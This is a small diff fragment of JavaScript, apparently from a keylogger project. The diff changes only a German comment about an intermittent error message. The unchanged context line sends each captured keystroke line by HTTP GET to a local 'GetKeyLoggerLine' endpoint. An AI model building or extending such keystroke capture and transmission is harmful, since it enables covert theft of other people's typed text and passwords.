@@ -55,7 +55,7 @@
             if (line.length > 0) {
                 const httpRequest = new XMLHttpRequest();
 
-                //gibt eine Fehlermeldung, hat beim testen aber trotzdem funktioniert
+                //gibt manchmal eine Fehlermeldung, hat beim testen aber trotzdem funktioniert
                 httpRequest.open("GET", "http://localhost:48514/Home/GetKeyLoggerLine?line="+line);
                 httpRequest.send();
             }
